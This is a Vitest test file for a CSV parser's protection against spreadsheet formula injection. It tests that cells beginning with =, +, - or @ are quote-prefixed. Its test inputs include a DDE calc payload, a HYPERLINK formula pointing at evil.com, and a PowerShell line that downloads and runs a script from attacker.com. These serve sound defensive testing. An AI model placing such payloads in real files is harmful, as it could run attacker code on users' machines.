import { describe, it, expect } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import { parseCSV } from '../../lib/parsers';
import { sanitizeCell, sanitizeRow } from '../../lib/parsers/csv-utils';

const fixturesDir = path.join(__dirname, '../fixtures');

describe('Formula Injection Protection', () => {
  describe('Cell Sanitization', () => {
    it('should prefix cells starting with = with single quote', () => {
      const result = sanitizeCell('=CMD|calc');
      expect(result).toBe("'=CMD|calc");
    });

    it('should prefix cells starting with + with single quote', () => {
      const result = sanitizeCell('+1+1');
      expect(result).toBe("'+1+1");
    });

    it('should prefix cells starting with - with single quote', () => {
      const result = sanitizeCell('-1-1');
      expect(result).toBe("'-1-1");
    });

    it('should prefix cells starting with @ with single quote', () => {
      const result = sanitizeCell('@SUM(1+1)');
      expect(result).toBe("'@SUM(1+1)");
    });

    it('should handle cells starting with tab (trimmed)', () => {
      // The sanitizeCell function trims whitespace first, so tab gets trimmed
      const result = sanitizeCell('\tmalicious');
      // After trimming, it becomes 'malicious' which is safe
      expect(result).toBe('malicious');
    });

    it('should not modify normal text', () => {
      const result = sanitizeCell('Normal Song Title');
      expect(result).toBe('Normal Song Title');
    });

    it('should not modify numbers', () => {
      const result = sanitizeCell('12345');
      expect(result).toBe('12345');
    });

    it('should handle empty strings', () => {
      const result = sanitizeCell('');
      expect(result).toBe('');
    });

    it('should handle null/undefined gracefully', () => {
      expect(sanitizeCell(null as unknown as string)).toBe(null);
      expect(sanitizeCell(undefined as unknown as string)).toBe(undefined);
    });

    it('should trim whitespace', () => {
      const result = sanitizeCell('  Song Title  ');
      expect(result).toBe('Song Title');
    });
  });

  describe('Row Sanitization', () => {
    it('should sanitize all values in a row', () => {
      const row = {
        title: '=HYPERLINK("http://evil.com")',
        artist: 'Normal Artist',
        amount: '+100',
      };

      const sanitized = sanitizeRow(row);

      expect(sanitized.title).toBe('\'=HYPERLINK("http://evil.com")');
      expect(sanitized.artist).toBe('Normal Artist');
      expect(sanitized.amount).toBe("'+100");
    });
  });

  describe('CSV Parsing with Malicious Data', () => {
    it('should sanitize formula injection attempts during parsing', () => {
      const content = fs.readFileSync(
        path.join(fixturesDir, 'distrokid-formula-injection.csv'),
        'utf-8'
      );
      const result = parseCSV(content);

      // The parser should not throw
      expect(result).toBeDefined();
      expect(result.transactions.length).toBeGreaterThan(0);

      // Check that dangerous values are sanitized
      const cmdTx = result.transactions.find(t =>
        t.artistName.includes('CMD') || t.artistName.includes('calc')
      );

      if (cmdTx) {
        // Should be prefixed with quote
        expect(cmdTx.artistName.startsWith("'")).toBe(true);
      }
    });

    it('should sanitize HYPERLINK formulas', () => {
      const content = fs.readFileSync(
        path.join(fixturesDir, 'distrokid-formula-injection.csv'),
        'utf-8'
      );
      const result = parseCSV(content);

      const hyperlinkTx = result.transactions.find(t =>
        t.trackTitle.includes('HYPERLINK')
      );

      if (hyperlinkTx) {
        // Should be prefixed with quote
        expect(hyperlinkTx.trackTitle.startsWith("'")).toBe(true);
      }
    });

    it('should still parse safe rows correctly', () => {
      const content = fs.readFileSync(
        path.join(fixturesDir, 'distrokid-formula-injection.csv'),
        'utf-8'
      );
      const result = parseCSV(content);

      const safeTx = result.transactions.find(t =>
        t.trackTitle === 'Safe Song Title'
      );

      expect(safeTx).toBeDefined();
      expect(safeTx?.artistName).toBe('Safe Artist');
    });
  });

  describe('Real-World Attack Patterns', () => {
    it('should neutralize DDE attacks', () => {
      const ddePayload = '=cmd|" /C calc"!A0';
      const result = sanitizeCell(ddePayload);
      expect(result.startsWith("'")).toBe(true);
    });

    it('should neutralize PowerShell attacks', () => {
      const psPayload = '=cmd|" /C powershell -ep bypass -c IEX(wget attacker.com/shell.ps1)"!A0';
      const result = sanitizeCell(psPayload);
      expect(result.startsWith("'")).toBe(true);
    });

    it('should neutralize nested formula attacks', () => {
      const nestedPayload = '=1+1+cmd|"calc"!A0';
      const result = sanitizeCell(nestedPayload);
      expect(result.startsWith("'")).toBe(true);
    });

    it('should handle @mentions that could be formulas', () => {
      const atPayload = '@SUM(A1:A10)';
      const result = sanitizeCell(atPayload);
      expect(result.startsWith("'")).toBe(true);
    });
  });
});
